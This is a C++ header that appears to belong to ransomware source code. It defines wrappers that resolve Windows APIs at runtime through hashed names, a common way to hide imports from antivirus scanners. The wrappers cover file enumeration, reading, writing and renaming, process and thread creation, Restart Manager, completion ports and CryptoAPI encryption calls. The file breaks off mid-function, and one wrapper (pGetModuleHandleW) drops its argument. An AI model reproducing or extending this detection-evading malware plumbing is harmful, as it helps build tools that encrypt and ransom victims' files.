#pragma once
#include "..\common.h"
#include <iphlpapi.h>
#include <RestartManager.h>
#include <TlHelp32.h>

enum MODULES {

	KERNEL32_MODULE_ID = 15,
	ADVAPI32_MODULE_ID,
	NETAPI32_MODULE_ID,
	IPHLPAPI_MODULE_ID,
	RSTRTMGR_MODULE_ID,
	USER32_MODULE_ID,
	WS2_32_MODULE_ID,
	SHLWAPI_MODULE_ID,
	SHELL32_MODULE_ID,
	OLE32_MODULE_ID,
	OLEAUT32_MODULE_ID,
	NTDLL_MODULE_ID

};

typedef enum _MPROCESSINFOCLASS {
	eProcessBasicInformation = 0,
	eProcessDebugPort = 7,
	eProcessWow64Information = 26,
	eProcessImageFileName = 27,
	eProcessBreakOnTermination = 29
} MPROCESSINFOCLASS;


namespace getapi {

	BOOL InitializeGetapiModule();
	BOOL IsRestartManagerLoaded();
	VOID SetRestartManagerLoaded(BOOL value);
	LPVOID GetProcAddressEx(LPCSTR ModuleName, DWORD ModuleId, DWORD Hash);
	LPVOID GetProcAddressEx2(LPSTR Dll, DWORD ModuleId, DWORD Hash, int CacheIndex);

};

#define KERNEL32DLL_HASH 0xb26771d8
#define LOADLIBRARYA_HASH 0x439c7e33

__forceinline BOOL WINAPI pCancelIo(
	_In_ HANDLE hFile
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1cae2a52, 109);//GetProcAddress(hKernel32, OBFA("CancelIo"));
	return pFunction(hFile);
}

__forceinline int WINAPI plstrlenW(
	LPCWSTR lpString
)
{
	INT(WINAPI * pFunction)(LPCWSTR);
	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));
	return pFunction(lpString);
}

__forceinline DWORD WINAPI pGetLogicalDriveStringsW(
	DWORD  nBufferLength,
	LPWSTR lpBuffer
)
{
	DWORD(WINAPI * pFunction)(DWORD, LPWSTR);
	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));
	return pFunction(nBufferLength, lpBuffer);
}

__forceinline int WINAPI plstrlenA(
	LPCSTR lpString
)
{
	INT(WINAPI * pFunction)(LPCSTR);
	pFunction = (INT(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x167d3edd, 106);//GetProcAddress(hKernel32, OBFA("lstrlenA"));
	return pFunction(lpString);
}

__forceinline BOOL WINAPI pReadFile(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x55f5048a, 105);//GetProcAddress(hKernel32, OBFA("ReadFile"));
	return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

__forceinline BOOL WINAPI pGetFileSizeEx(
	HANDLE         hFile,
	PLARGE_INTEGER lpFileSize
)
{
	BOOL(WINAPI * pFunction)(HANDLE, PLARGE_INTEGER);
	pFunction = (BOOL(WINAPI*)(HANDLE, PLARGE_INTEGER))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x43ba1ffb, 104);//GetProcAddress(hKernel32, OBFA("GetFileSizeEx"));
	return pFunction(hFile, lpFileSize);
}

__forceinline HANDLE WINAPI pGetCurrentProcess()
{
	HANDLE(WINAPI * pFunction)();
	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3cd723f8, 103);//GetProcAddress(hKernel32, OBFA("GetCurrentProcess"));
	return pFunction();
}

__forceinline BOOL WINAPI pWriteFile(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));
	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

__forceinline BOOL WINAPI pWow64DisableWow64FsRedirection(
	PVOID* OldValue
)
{
	BOOL(WINAPI * pFunction)(PVOID*);
	pFunction = (BOOL(WINAPI*)(PVOID*))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5126a209, 101);//GetProcAddress(hKernel32, OBFA("Wow64DisableWow64FsRedirection"));
	return pFunction(OldValue);
}

__forceinline DWORD WINAPI pGetProcessId(
	HANDLE Process
)
{
	DWORD(WINAPI * pFunction)(HANDLE);
	pFunction = (DWORD(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x71114e08, 100);//GetProcAddress(hKernel32, OBFA("GetProcessId"));
	return pFunction(Process);
}

__forceinline BOOL WINAPI pSetEndOfFile(
	HANDLE hFile
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5fa74ea0, 99);//GetProcAddress(hKernel32, OBFA("SetEndOfFile"));
	return pFunction(hFile);
}

__forceinline DWORD WINAPI pWaitForSingleObject(
	HANDLE hHandle,
	DWORD  dwMilliseconds
)
{
	DWORD(WINAPI * pFunction)(HANDLE, DWORD);
	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));
	return pFunction(hHandle, dwMilliseconds);
}

__forceinline HANDLE WINAPI pCreateFileW(
	LPCWSTR               lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
)
{
	HANDLE(WINAPI * pFunction)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));
	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

__forceinline DWORD WINAPI pGetFileAttributesW(
	LPCWSTR lpFileName
)
{
	DWORD(WINAPI * pFunction)(LPCWSTR);
	pFunction = (DWORD(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x81737792, 96);//GetProcAddress(hKernel32, OBFA("GetFileAttributesW"));
	return pFunction(lpFileName);
}

__forceinline BOOL WINAPI pSetFileAttributesW(
	LPCWSTR lpFileName,
	DWORD   dwFileAttributes
)
{
	BOOL(WINAPI * pFunction)(LPCWSTR, DWORD);
	pFunction = (BOOL(WINAPI*)(LPCWSTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x2e6f01df, 95);//GetProcAddress(hKernel32, OBFA("SetFileAttributesW"));
	return pFunction(lpFileName, dwFileAttributes);
}

__forceinline BOOL WINAPI pWow64RevertWow64FsRedirection(
	PVOID OlValue
)
{
	BOOL(WINAPI * pFunction)(PVOID);
	pFunction = (BOOL(WINAPI*)(PVOID))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x58cb0595, 94);//GetProcAddress(hKernel32, OBFA("Wow64RevertWow64FsRedirection"));
	return pFunction(OlValue);
}

__forceinline DWORD WINAPI pGetLastError()
{
	DWORD(WINAPI * pFunction)();
	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));
	return pFunction();
}

__forceinline LPWSTR WINAPI plstrcatW(
	LPWSTR  lpString1,
	LPCWSTR lpString2
)
{
	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd1da9915, 92);//GetProcAddress(hKernel32, OBFA("lstrcatW"));
	return pFunction(lpString1, lpString2);
}

__forceinline BOOL WINAPI pCloseHandle(
	HANDLE hObject
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));
	return pFunction(hObject);
}

__forceinline void WINAPI pGetNativeSystemInfo(
	LPSYSTEM_INFO lpSystemInfo
)
{
	VOID(WINAPI * pFunction)(LPSYSTEM_INFO);
	pFunction = (VOID(WINAPI*)(LPSYSTEM_INFO))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xde1467b1, 90);//GetProcAddress(hKernel32, OBFA("GetNativeSystemInfo"));
	return pFunction(lpSystemInfo);
}

__forceinline BOOL WINAPI pSetFilePointerEx(
	HANDLE         hFile,
	LARGE_INTEGER  liDistanceToMove,
	PLARGE_INTEGER lpNewFilePointer,
	DWORD          dwMoveMethod
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));
	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);
}

__forceinline BOOL WINAPI pCreateProcessW(
	LPCWSTR               lpApplicationName,
	LPWSTR                lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCWSTR               lpCurrentDirectory,
	LPSTARTUPINFOW        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL(WINAPI * pFunction)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3a963686, 88);//GetProcAddress(hKernel32, OBFA("CreateProcessW"));
	return pFunction(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}

__forceinline LPWSTR WINAPI plstrcpyW(
	LPWSTR  lpString1,
	LPCWSTR lpString2
)
{
	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3fd9cc6a, 87);//GetProcAddress(hKernel32, OBFA("lstrcpyW"));
	return pFunction(lpString1, lpString2);
}

__forceinline BOOL WINAPI pMoveFileW(
	LPCWSTR lpExistingFileName,
	LPCWSTR lpNewFileName
)
{
	BOOL(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x102e520c, 86);//GetProcAddress(hKernel32, OBFA("MoveFileW"));
	return pFunction(lpExistingFileName, lpNewFileName);
}

__forceinline LPWSTR WINAPI pGetCommandLineW()
{
	LPWSTR(WINAPI * pFunction)();
	pFunction = (LPWSTR(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8a0ae76f, 85);//GetProcAddress(hKernel32, OBFA("GetCommandLineW"));
	return pFunction();
}

__forceinline HANDLE WINAPI pCreateMutexA(
	LPSECURITY_ATTRIBUTES lpMutexAttributes,
	BOOL                  bInitialOwner,
	LPCSTR                lpName
)
{
	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x20d8fa8c, 84);//GetProcAddress(hKernel32, OBFA("CreateMutexA"));
	return pFunction(lpMutexAttributes, bInitialOwner, lpName);
}

__forceinline int WINAPI pMultiByteToWideChar(
	UINT                              CodePage,
	DWORD                             dwFlags,
	LPCCH lpMultiByteStr,
	int                               cbMultiByte,
	LPWSTR                            lpWideCharStr,
	int                               cchWideChar
)
{
	int(WINAPI * pFunction)(UINT, DWORD, LPCCH, int, LPWSTR, int);
	pFunction = (int(WINAPI*)(UINT, DWORD, LPCCH, int, LPWSTR, int))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8aa116bb, 83);//GetProcAddress(hKernel32, OBFA("MultiByteToWideChar"));
	return pFunction(CodePage, dwFlags, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar);
}

__forceinline HANDLE WINAPI pCreateThread(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
)
{
	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));
	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

__forceinline int WINAPI plstrcmpiW(
	LPCWSTR lpString1,
	LPCWSTR lpString2
)
{
	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));
	return pFunction(lpString1, lpString2);
}

__forceinline BOOL WINAPI pHeapFree(
	HANDLE                 hHeap,
	DWORD                  dwFlags,
	LPVOID lpMem
)
{
	BOOL(WINAPI * pFunction)(HANDLE, DWORD, LPVOID);
	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, LPVOID))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x39c938ba, 80);//GetProcAddress(hKernel32, OBFA("HeapFree"));
	return pFunction(hHeap, dwFlags, lpMem);
}

__forceinline LPVOID WINAPI pHeapAlloc(
	HANDLE hHeap,
	DWORD  dwFlags,
	SIZE_T dwBytes
)
{
	LPVOID(WINAPI * pFunction)(HANDLE, DWORD, SIZE_T);
	pFunction = (LPVOID(WINAPI*)(HANDLE, DWORD, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe343b540, 79);//GetProcAddress(hKernel32, OBFA("HeapAlloc"));
	return pFunction(hHeap, dwFlags, dwBytes);
}

__forceinline HANDLE WINAPI pGetProcessHeap()
{
	HANDLE(WINAPI * pFunction)();
	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x623e9318, 78);//GetProcAddress(hKernel32, OBFA("GetProcessHeap"));
	return pFunction();
}

__forceinline BOOL WINAPI pCreateTimerQueueTimer(
	PHANDLE             phNewTimer,
	HANDLE              TimerQueue,
	WAITORTIMERCALLBACK Callback,
	PVOID               DueTime,
	DWORD               Period,
	DWORD               Flags,
	ULONG               Parameter
)
{
	BOOL(WINAPI * pFunction)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
	pFunction = (BOOL(WINAPI*)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe59cbfdb, 77);//GetProcAddress(hKernel32, OBFA("CreateTimerQueueTimer"));
	return pFunction(phNewTimer, TimerQueue, Callback, DueTime, Period, Flags, Parameter);
}

__forceinline void WINAPI pEnterCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	VOID(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));
	return pFunction(lpCriticalSection);
}

__forceinline BOOL WINAPI pDeleteTimerQueue(
	HANDLE TimerQueue
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x6998a9d3, 75);//GetProcAddress(hKernel32, OBFA("DeleteTimerQueue"));
	return pFunction(TimerQueue);
}

__forceinline void WINAPI pLeaveCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));
	return pFunction(lpCriticalSection);
}

__forceinline void WINAPI pInitializeCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));
	return pFunction(lpCriticalSection);
}

__forceinline BOOL WINAPI pGetQueuedCompletionStatus(
	HANDLE       CompletionPort,
	LPDWORD      lpNumberOfBytesTransferred,
	PULONG_PTR   lpCompletionKey,
	LPOVERLAPPED* lpOverlapped,
	DWORD        dwMilliseconds
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86380c7, 72);//GetProcAddress(hKernel32, OBFA("GetQueuedCompletionStatus"));
	return pFunction(CompletionPort, lpNumberOfBytesTransferred, lpCompletionKey, lpOverlapped, dwMilliseconds);
}

__forceinline void WINAPI pExitThread(
	DWORD dwExitCode
)
{
	void(WINAPI * pFunction)(DWORD);
	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));
	return pFunction(dwExitCode);
}


__forceinline BOOL WINAPI pPostQueuedCompletionStatus(
	_In_     HANDLE       CompletionPort,
	_In_     DWORD        dwNumberOfBytesTransferred,
	_In_     ULONG_PTR    dwCompletionKey,
	_In_opt_ LPOVERLAPPED lpOverlapped
)
{
	BOOL(WINAPI * pFunction)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED);
	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x442d716b, 70);//GetProcAddress(hKernel32, OBFA("PostQueuedCompletionStatus"));
	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);
}

__forceinline void WINAPI pSleep(
	DWORD dwMilliseconds
)
{
	void(WINAPI * pFunction)(DWORD);
	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb09422e9, 69);//GetProcAddress(hKernel32, OBFA("Sleep"));
	return pFunction(dwMilliseconds);
}

__forceinline HGLOBAL WINAPI pGlobalAlloc(
	UINT   uFlags,
	SIZE_T dwBytes
)
{
	HGLOBAL(WINAPI * pFunction)(UINT, SIZE_T);
	pFunction = (HGLOBAL(WINAPI*)(UINT, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb2eb0cd3, 68);//GetProcAddress(hKernel32, OBFA("GlobalAlloc"));
	return pFunction(uFlags, dwBytes);
}

__forceinline HGLOBAL WINAPI pGlobalFree(
	HGLOBAL hMem
)
{
	HGLOBAL(WINAPI * pFunction)(HGLOBAL);
	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8d87ce2b, 67);//GetProcAddress(hKernel32, OBFA("GlobalFree"));
	return pFunction(hMem);
}

__forceinline void WINAPI pDeleteCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x22d94276, 66);//GetProcAddress(hKernel32, OBFA("DeleteCriticalSection"));
	return pFunction(lpCriticalSection);
}

__forceinline HANDLE WINAPI pCreateIoCompletionPort(
	_In_     HANDLE    FileHandle,
	_In_opt_ HANDLE    ExistingCompletionPort,
	_In_     ULONG_PTR CompletionKey,
	_In_     DWORD     NumberOfConcurrentThreads
)
{
	HANDLE(WINAPI * pFunction)(HANDLE, HANDLE, ULONG_PTR, DWORD);
	pFunction = (HANDLE(WINAPI*)(HANDLE, HANDLE, ULONG_PTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xac9084f4, 65);//GetProcAddress(hKernel32, OBFA("CreateIoCompletionPort"));
	return pFunction(FileHandle, ExistingCompletionPort, CompletionKey, NumberOfConcurrentThreads);
}

__forceinline HANDLE WINAPI pCreateTimerQueue()
{
	HANDLE(WINAPI * pFunction)();
	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x071a6760, 64);//GetProcAddress(hKernel32, OBFA("CreateTimerQueue"));
	return pFunction();
}

__forceinline HANDLE WINAPI pFindFirstFileW(
	LPCWSTR            lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
	HANDLE(WINAPI * pFunction)(LPCWSTR, LPWIN32_FIND_DATAW);
	pFunction = (HANDLE(WINAPI*)(LPCWSTR, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4796a6c5, 63);//GetProcAddress(hKernel32, OBFA("FindFirstFileW"));
	return pFunction(lpFileName, lpFindFileData);
}

__forceinline BOOL WINAPI pFindNextFileW(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPWIN32_FIND_DATAW);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xff036af1, 62);//GetProcAddress(hKernel32, OBFA("FindNextFileW"));
	return pFunction(hFindFile, lpFindFileData);
}

__forceinline BOOL WINAPI pFindClose(
	HANDLE hFindFile
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x013ee65d, 61);//GetProcAddress(hKernel32, OBFA("FindClose"));
	return pFunction(hFindFile);
}

__forceinline int WINAPI plstrcmpW(
	LPCWSTR lpString1,
	LPCWSTR lpString2
)
{
	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
	pFunction = (int(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd76d434b, 60);//GetProcAddress(hKernel32, OBFA("lstrcmpW"));
	return pFunction(lpString1, lpString2);
}

__forceinline LPVOID WINAPI pVirtualAlloc(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
)
{
	LPVOID(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, DWORD);
	pFunction = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1aab6455, 59);//GetProcAddress(hKernel32, OBFA("VirtualAlloc"));
	return pFunction(lpAddress, dwSize, flAllocationType, flProtect);
}

__forceinline DWORD WINAPI pWaitForMultipleObjects(
	DWORD        nCount,
	const HANDLE* lpHandles,
	BOOL         bWaitAll,
	DWORD        dwMilliseconds
)
{
	DWORD(WINAPI * pFunction)(DWORD, const HANDLE*, BOOL, DWORD);
	pFunction = (DWORD(WINAPI*)(DWORD, const HANDLE*, BOOL, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x78b61591, 58);//GetProcAddress(hKernel32, OBFA("WaitForMultipleObjects"));
	return pFunction(nCount, lpHandles, bWaitAll, dwMilliseconds);
}

__forceinline DWORD WINAPI pGetCurrentProcessId()
{
	DWORD(WINAPI * pFunction)();
	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb4988097, 57);//GetProcAddress(hKernel32, OBFA("GetCurrentProcessId"));
	return pFunction();
}

__forceinline HMODULE WINAPI pGetModuleHandleW(
	LPCWSTR lpModuleName
)
{
	HMODULE(WINAPI * pFunction)();
	pFunction = (HMODULE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1c8a3d6c, 56);//GetProcAddress(hKernel32, OBFA("GetModuleHandleW"));
	return pFunction();
}





__forceinline BOOL WINAPI pCryptImportKey(
	HCRYPTPROV hProv,
	const BYTE* pbData,
	DWORD      dwDataLen,
	HCRYPTKEY  hPubKey,
	DWORD      dwFlags,
	HCRYPTKEY* phKey
)
{
	BOOL(WINAPI * pFunction)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);
	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0x70d2c0e4, 55);//GetProcAddress(hAdvapi32, OBFA("CryptImportKey"));
	return pFunction(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);
}

__forceinline BOOL WINAPI pCryptEncrypt(
	HCRYPTKEY  hKey,
	HCRYPTHASH hHash,
	BOOL       Final,
	DWORD      dwFlags,
	BYTE* pbData,
	DWORD* pdwDataLen,
	DWORD      dwBufLen
)
{
	BOOL(WINAPI * pFunction)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD);
	pFunction = (BOOL(WINAPI*)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xd3bb19e6, 54);//GetProcAddress(hAdvapi32, OBFA("CryptEncrypt"));
	return pFunction(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);
}

__forceinline BOOL WINAPI pCryptGenRandom(
	HCRYPTPROV hProv,
	DWORD      dwLen,
	BYTE* pbBuffer
)
{
	BOOL(WINAPI * pFunction)(HCRYPTPROV, DWORD, BYTE*);
	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, DWORD, BYTE*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xe6b09957, 53);//GetProcAddress(hAdvapi32, OBFA("CryptGenRandom"));
	return pFunction(hProv, dwLen, pbBuffer);
}

__forceinline BOOL WINAPI pCryptAcquireContextA(
	HCRYPTPROV* phProv,
	LPCSTR     szContainer,
	LPCSTR     szProvider,
	DWORD      dwProvType,
	DWORD      dwFlags
)
{
